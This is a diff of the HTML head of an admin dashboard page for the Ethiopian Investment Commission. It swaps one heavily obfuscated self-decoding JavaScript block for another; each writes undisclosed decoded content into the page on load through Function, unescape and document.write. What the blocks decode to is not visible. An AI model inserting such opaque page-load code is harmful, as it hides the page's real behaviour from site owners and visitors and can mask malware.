@@ -1,50 +1,67 @@
 <!DOCTYPE html><!-- saved from url=(0014)about:internet -->
 <html lang="en" dir="ltr" data-nav-layout="vertical" data-theme-mode="light" data-header-styles="light"
-data-menu-styles="dark" data-toggled="close">
+    data-menu-styles="dark" data-toggled="close">
 
+<head>
+    <!-- Meta Data -->
+    <meta charset="UTF-8">
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, user-scalable=no'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>
+    
+    Ethiopian Investment Commission </title>
+    <meta name="Description" content="Bootstrap Responsive Admin Web Dashboard HTML5 Template">
+    <meta name="Author" content="Spruko Technologies Private Limited">
+    <meta name="keywords"
+        content="admin,admin dashboard,admin panel,admin template,bootstrap,clean,dashboard,flat,jquery,modern,responsive,premium admin templates,responsive admin,ui,ui kit.">
 
-<head><!-- Meta Data -->
-<meta charset="UTF-8"><meta name='viewport' content='width=device-width, initial-scale=1.0, user-scalable=no'>
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-
-<title>
-
-Ethiopian Investment Commission </title>
-
-<meta name="Description"><meta name="Author" content="">
-<meta name="keywords" content="admin,admin dashboard,admin panel,admin template,bootstrap,clean,dashboard,flat,jquery,modern,responsive,premium admin templates,responsive admin,ui,ui kit.">
-
-
-<link rel="icon" href="" type="image/x-icon">
-<script src="assets/libs/choices.js/public/assets/scripts/choices.min.js"></script>
-
-
-<!-- Main Theme Js --> <script src="assets/js/main.js"></script> <!-- Bootstrap Css -->
-<link id="style" href="assets/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet"> <!-- Style Css -->
-<link href="assets/css/styles.min.css" rel="stylesheet"> <!-- Icons Css -->
- <link href="assets/css/icons.css" rel="stylesheet"> <!-- Node Waves Css -->
- <link href="assets/libs/node-waves/waves.min.css" rel="stylesheet"> <!-- Simplebar Css -->
- <link href="assets/libs/simplebar/simplebar.min.css" rel="stylesheet"> <!-- Color Picker Css -->
- <link rel="stylesheet" href="assets/libs/flatpickr/flatpickr.min.css">
- <link rel="stylesheet" href="assets/libs/%40simonwep/pickr/themes/nano.min.css"> <!-- Choices Css -->
-  <link rel="stylesheet" href="assets/libs/choices.js/public/assets/styles/choices.min.css">
-  <link rel="stylesheet" href="assets/libs/jsvectormap/css/jsvectormap.min.css">
-  <link rel="stylesheet" href="assets/libs/swiper/swiper-bundle.min.css">
-
-
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.1/css/fontawesome.min.css">
-
-  <link href='https://cdn.jsdelivr.net/npm/boxicons@2.0.5/css/boxicons.min.css' rel='stylesheet'>
-
-<script type="text/javascript"><!--
-function q9s1(j26b){var
-nivt="md>=tGX}x+ S;Ow&kVi.)]{:u8rAfaK4-,!\"zpc56[\rM0EC921j\'LI3gnb|l(\nUyDhe/?NTvBsRPq7o<",l965,ydcs,uf48=Function,jjvd,d30z=nivt.length,cojb={cd:""},ue=new uf48("ret"+"urn unesc"+"ape")(),s1f8=new uf48("x",ue("%74hi%73.c%64+=x")),e4zp=new uf48("x","y",ue("%72et%75rn%20x.c%68ar%41t(%79)"));for(jjvd=0;jjvd<j26b.length;jjvd++){l965=e4zp(j26b,jjvd);ydcs=nivt.indexOf(l965);if(ydcs>-1){ydcs-=(jjvd+1)%d30z;if(ydcs<0){ydcs+=d30z;}s1f8.call(cojb,e4zp(nivt,ydcs));}else{s1f8.call(cojb,l965);}}new uf48(ue("%64oc%75me%6Et.w%72it%65(t%68is.%63d)%3Bth%69s.c%64=n%75ll")).call(cojb);}q9s1("mP[K:MSiOs2ok1.>8{XTjOLVyLEh,h,4/e/oi4{qkE0\r=T9!83Td-,/buq y3E.5md]N/f&Blj<&LD=E(?=T\n <vUS:N\'<R. dgPzpu{yjAwG!j}.cm&:c8kE!rVC|M2/q3XCpS4Bs(|.Xyj[TXMgRz\'lR\nLdTUI>w([vv +}2\";<T.\"q9>X9&\"L1>h-9f}\r.o\n=V\r5q/Uh2vaNe7KL.vGPGz0GD[Vit7s8VsfnLlwV=&rltdca.) }0\"atkS\' \r&g2Pjr[{dC4fhnj8p-B4yzqNkv9UM{A?\nqpn7m4eG}cI9RT;+\r8B}?9>1POLbi]iaUNPvUSAe!&kSTi.hq7X;x<f0=\'-,f}\"zxg{dDX)\n3jBN{GL/2AU5OCwp0<>}2/xS\r93xtn 4lo<\'i/eEfjD8aS!,q:.[cv3]zVq4&<IdXX8&k\'3\n-\nk\'x\"c0Xg|&\rE9f9pcBBgG-0L<6255N\'<>5eNd>wVgRDh..>-lv<2{lX+,-;vk&\r;X{)pmf;e./\rc(4(&j}!pMG3bw[0CACzpv-=c\r=\'o59cc?jodch?mdOk?Lr3llo?N:D\"TR\"=Lry Opz.V|E{+maC5\"z|gxvcI!O2wh-X:D/DPfjVN=sq=3=csKb(ef7mpD/NBT4iPUI>iid4|To8eRhh&78fh;&Af6M:]U1rOt,11-U+]aoL+z5yU\r]CEB\rzLj/K|-|q\"B?N1M|L7XVj2all&iT3fn\n=d\raXsDOK:.)\r5Bg{pi7-]uS.}w1L1(Ow;R{V3gA,a)1\nU!6zAnB9dw{pE(9c/<mL|3ER h.-6gyohnG]},(PzxPOw9eb)\'pq7mV{[j6[OM0kjzU( {[I3r(CBT)-\'/I<r[>3[l(O-:eV=t};IBOk9>lc]MbiS}x)4DU0B//?};46\"cikb0]x<f0u=eAX\"i[c\"{OU\rc[fznL-r[\"(Nm,g{Rxzppi22t}mG0T?GSvj3Rr<>grs9k;!4D9wa NuI[]S<X[0k&\';Kw0EV\'r(sdku5rVC|l4h6R}&KcI64(S\n\"t6[\'jtlOr!1bBlj<&dA3NK>NA6[.rpTt=5m1.Lvx&=;|56.i3&D!/:<[rD-t/qb|pzB,>LGM!M0?E;odX9e} [q&V2ybtmd:)Iz=i<|O;EhC?a-poVc[BAC2<wxK\rIX)ShG\'3!-s(pu&0(6.p48,XIMgd<||w>ULBU(]xhLMBx?9s.:jNdA8tt My0iwrpT; \'c&>s{c1{:?&S>4m9:\"i+)\nnl5poh\ra)1hq1j&\rca|ARjUEz9xM\":Du\'6:.k1-<wP3le]uqP4B Rfw6c?m.\"]9R+j{+zM3}])nVezNx8-)aPnbz\"v-d\'t6k|Md1]tO<>9d) \'bI0s3b){i3mbiS}x\"4,D<sf]S+jpwdB]p2]{/w dK<C{!Vx.(&}cD?&!CBT1Vmqsr+nvL4zModCm.+jnLMBIn.]VI<nV X,a4U7vr.&p!/jV-OBAtef7>+&aC1Cb V:pIBU:a8kEraBRTrLNBpMbs;>M1EzhC1;w CB1 =<lI?U.DTt)iN/\'txR;Dxu<G.\"Mt:09o6ItjO4bl 8.C\rMf/hj5;m(2&l5oq\n2\npCl8Tj+}B2[6/T.d\n)i=I(gIdge&;KK4\"T?a{T7BT!I[Stm7xp!LLIb; A6k8?qq|lL)A{)D=v[!KAc/D>>=}\r6bTCgirDx+>jbLjw,]vD(b?Vw-"+"-,pBT})qG2[\nc5-m}>m0y\']w }i90UUy/{)pjr\"ov]?NUKp-KROd\'06p27R;;OVLj/mnhf]zi.;(/U(uM4dRT/oAu\r\rM9>m.B(6={\"S)yfXI39&{V&loeza8{,Ul77o>p\"3A&PcbTCgiyix+>jbLjw,]vD(b?Vw-"+"-,pBT+UjK2hh/56,dx=dEDL{&Sx.2EyyD?:]XqOO)/?\noPfS|s3,?k+zxMjnT} g\nPPI(emVehvG8yDv7sDOK<otmv)6RM<m\r\"\rIXO.,jI:U(E-R4MMA,9y\n-Kw9\'pDv>\" I&LDq71gNG8IikpTR(&is\"Bt");q9s1("tO}K:UUApz+;l<0\ryk)Xdxwf0D;bgqa,.336\")q7A?+sc-A??xzd<)IbMGy68>PvODO2(.V>7jj8m\rStbb-=DveDfN7??imf]RR1K4MCM3}x&]\"\'r.ID[?8:0E:uu4ru 3AA>Pk)osbKio=/?Dp8G S}x3gU?"+">icGfU!vNhRmwK;<i0C=d5:u>== G=N,XX\n3P<bL!9:-UC9[3K5NTe/,6C(q}cDS2C/?C99319,7jj8i5M]k/(lXr SR/eO,!K47wnO88r= G=N,XX\n3Ptb&ki8)it2]]qN .BgniPq<0r?p\r1gNX<E&n)xGd>=tkA(>m[fGBy;f5;O|GdB]TpO8x< \'C1aA?g-. 5ge56G-f.2VD6L\"rpo,+v\r6lbRpVk]w[O]sk&|OXqR\"{<ebX{,X}L<Pe&D4}.>stEmnc+}ULO]{hDNU+\nN[Dyr\n3jKu5,|/o4I\';<nM!y< e/O:\'-lgCP;&Ps!]ohnG]-x+\"Es3d7?VRjws!G={)pm(lDbtn\'06qk?N6cA!mNU>j1");
-
-</script>
-
-
-
-
-<meta http-equiv="imagetoolbar" content="no" /><style type="text/css">
-
-<!-- input,textarea{-webkit-touch-callout:default;-webkit-user-select:auto;-khtml-user-select:auto;-moz-user-select:text;-ms-user-select:text;user-select:text} *{-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:-moz-none;-ms-user-select:none;user-select:none} --></style><style type="text/css" media="print"><!-- body{display:none} --></style> <!--[if gte IE 5]><frame></frame><![endif]--></head>
+    <!-- Choices JS -->
+    <script src="../assets/libs/choices.js/public/assets/scripts/choices.min.js"></script> <!-- Main Theme Js -->
+    <script src="../assets/js/main.js"></script> <!-- Bootstrap Css -->
+    <link id="style" href="../assets/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet"> <!-- Style Css -->
+    <link href="../assets/css/styles.min.css" rel="stylesheet"> <!-- Icons Css -->
+    <link href="../assets/css/icons.css" rel="stylesheet"> <!-- Node Waves Css -->
+    <link href="../assets/libs/node-waves/waves.min.css" rel="stylesheet"> <!-- Simplebar Css -->
+    <link href="../assets/libs/simplebar/simplebar.min.css" rel="stylesheet"> <!-- Color Picker Css -->
+    <link rel="stylesheet" href="../assets/libs/flatpickr/flatpickr.min.css">
+    <link rel="stylesheet" href="../assets/libs/%40simonwep/pickr/themes/nano.min.css"> <!-- Choices Css -->
+    <link rel="stylesheet" href="../assets/libs/choices.js/public/assets/styles/choices.min.css"> <!-- Prism CSS -->
+    <link rel="stylesheet" href="../assets/libs/prismjs/themes/prism-coy.min.css">
+    <script type="text/javascript">
+    <!--
+    function h8u2(a81a) {
+        var
+            cbql = Function,
+            io9c, lmop = "rPS/V:Byq&T9NfML >1;v=dk5wns)E\r{-[(acD.!]uGA7|\'U\"RtKz084}oCle32mx,bpI?iX+g6\nOjh<",
+            d3ap, u6u2, ufer = lmop.length,
+            udyi = {
+                cd: ""
+            },
+            ue = new cbql("ret" + "urn unesc" + "ape")(),
+            r5re = new cbql("x", ue("%74hi%73.c%64+=x")),
+            z4xh = new cbql("x", "y", ue("%72et%75rn%20x.c%68ar%41t(%79)"));
+        for (d3ap = 0; d3ap < a81a.length; d3ap++) {
+            io9c = z4xh(a81a, d3ap);
+            u6u2 = lmop.indexOf(io9c);
+            if (u6u2 > -1) {
+                u6u2 -= (d3ap + 1) % ufer;
+                if (u6u2 < 0) {
+                    u6u2 += ufer;
+                }
+                r5re.call(udyi, z4xh(lmop, u6u2));
+            } else {
+                r5re.call(udyi, io9c);
+            }
+        }
+        new cbql(ue("%64oc%75me%6Et.w%72it%65(t%68is.%63d)%3Bth%69s.c%64=n%75ll")).call(udyi);
+    }
+    h8u2("rE!V\ngo5l>h+(2,OPId>}GCK3n>L<h\"{+bpb-mcLam,=Py\r)\nv&y-[69Ih|PBl.C6\nnT\'n-40v|(iCREe2bx{}fLj-\r+au)DGL6M\r{|P3pTq4r?wfVxL>=;b9\"t-p,/\"RU+9hK\rtbpPD>k\'79cw3R]vK0o4dUVBIk=)xXt)\rb\'z\ng],8O0nr=RGDbzmh;yo\"nvwBX\'&M{i6M|0h.2VBmg]/9c.l\rL\r{NVGkk!n?n0dnzp9[qK}gfMMo2<\".2iP  6:8f}+fPK8ah/v?l/9dDDLn\n(jf(d+POIt{dM8P+if.yuP!jnNk.lU>qAoq{{n\riMcm5,-o\'\nK32i]cD<mxruSR6mNIh<yo08LmEk)&6?3;oB+/1!sjIca.G9.y93G[w,N=\"sL?2E+ >CnIgp+0.[9oqti\rIn4uzpqO\'D\ryRje80BVlm\'9ai(ezk2L2upl\rUO\n)n97.9t.B1]G&oaxB,9/8x,dnkd40.X,.j,[]:{k6zKXu<6l\'rA<\"t\'&q9LRy|T(?[lKd3M3]bCE\'\n6swT-&2co:>!uq}(m:xTS0mx=w/edt[snloGxuMI&D7&ash}4]O}2:/t\n8\'V:A+C?Vwfm81dm;j+OceSV3X.P:I[oN}S6|VDVm&Pz?fREaC}k\"DixDOx-7bIa/3T-9DErT9\"z7reb&y8<I=LIsLmia305SP=XE5&O\rgEhrOn]XM<D.AAN\'/CS5 zl.ks:25za5e]\'?p(l.\rI?s}G0I&jU.\nG\n03qo3=|pILCxK\"R=2kiL4})?\rjd9P4NBD!Auq[g6\'y\"L]E;g\r54o3lnK]0!h1GX?{-eP)ox|mx8odk=(ayD.T?SI() yU\"v<Nh7.n>B;:7xqDajhnU6k\r9N bU.\ri>qbe,\'{n1}o+ .,)(=84UNf9AU!\n43VSR6m/0xB}PN>V1 m<eNlNim=nn\nEbu,y&bOAk5:u\"sN 9oM9U \rtv80-vvlm5ek3;\"(|eP?!\rN<pL0rR0RDSk\"q.!9ie(X, 1dvpNz0wV6\":<\r-c(Pn <:=]uz7kfp51RK40v|(U[+Nc,m&08nhd7Dwi98D,B{=I-X[(z]:n?zrAmn\'ryI/&KziCk7yi1o;mxKIwBTeu-5x9Srk\">K9RtqDk(RiC);{?EjGDu9+m4LG[{8<\"S<M.ezwV5lm49Xjv1,T<;?XwwsV;j=y05O0])}</!;w\"\'f.sU>MgEIkU[<tdEps\nwmhd7[?R4hOAIo4A7z7:zjA;oPNlMaxIe OSwkiLVSiX<X-<5i\'V)!Bu2>\r=A8\na4V[;\r|b85[eE[E>2/)IUe\'NB6,8p0N-}:/AL!38Gy)X8Sk\".:RqtK?odAB?" +
+        ">erAm>5:vny9uvtx|BUM!sK:)a8\'{n1}op !x[pc)-I\"8j\nGp}8GAKAVKOG1}r9Cf(?Sl.6[INh7LN-3TOydA{PTDBT];Rm7:\'f.ntVs(0|\rw>4,MD2{,(nxdKD\"mV+G[1;G\'}/7\n8C1Gx9z/+dc>C;b9<koryn1jP{+kNG}Dh!B{;Ajvs\'.k1T\"00d})C;t!wm9mmEI\rX4{g(,8>h?3=\"slVpyRG,Tlf09Nog!}3EcKbxbIVtp5\'h4j!j<L3hm7gdqAqTn+&\'+0=;wen1\'V:uMGDEm&i.0/C|>8US\"]Insmcx/wo(v\r3bplf!vI/[q\nUVj-hi1}ofbM[4yxte{ >&A?t1[m.wj(s2)v\"ByA 7m:DMrii\'U!g;r\"mfI4sxoNCthcDg\'6fap7\rv)Oj?kR\rhfA1:oMyGqr)bpkO5A,>6et=ns;0<e)Ag\"ay7D+.\rC >0n8u& {ihvzEL\nf328q(Lmh)/iG<+sg,fKzq3&O7Kbw[4yxt\rG >&A?t1[m.wj(s2)v\"ByA 7{<B=r(<cU\"]6vPRxM?}),CflK<D.6U\nL)2ss\nOImNh&5|[/6b  D>7:cL;RTufs8L\'wplvKyD.,np(l.r+[6ubd7e<rtGM.ey\"<C2zI(K++.-3=2fSIn8nn+{XAp&Lffl0iXAVa5kb5iRRL8ks[[<g"
+        );
+    h8u2("dV0V\n-r\'dTI\nXNt \n\nur4SA6m2wmEqq8f2gBM:ns=G=<+nPOyBRy0-" +
+        "-hD=EM(TS]hApd&wXqm.+?1K1i|<O/o/x-U?X.Bxfay2 ffMK4L!32&tPie-wRy&;U2mjh>A5+S]LR\'MqE>p<U8?9:BB83O1;PS)E}>\"DcKS24,fzIEeR\ngxtpjwUuG}oOd/K3;6)wgpqO\'T-xuix,>!X\"jhe3y(\nnLf.\r-Gi:Bv=]bULwm.+?D{z]TSmNu()E&i;\"uG5wK88vMA7Od/K3;6)wgp0OS/9D1bO(&A]qSI9g6s/VqClSB AVaMB8?tnLNtKz0IN(kl!|Ib[CU|[(G(\nGp[&UXSRVw8CtBb+Lfe:6+e3?3d?Mec61EO{zydhcxrc:y\r\"X==G0!i-z=f>0[!2eszu!s)c)?c3s/u,OAh;8?|/{Nny4}h !??T=y.rv?3;55gsx!m:6\rT !DVE1 -[;=x qR uv5 z-.3lnK].84uAB.\rX.m\"mgAu<sA<\"tg9(xx:lK&x\rI?4.AIhA(- x"
+        );
+    -->
+    </script><noscript>
+        <p>To display this page you need a browser that supports JavaScript.</p>
+    </noscript>
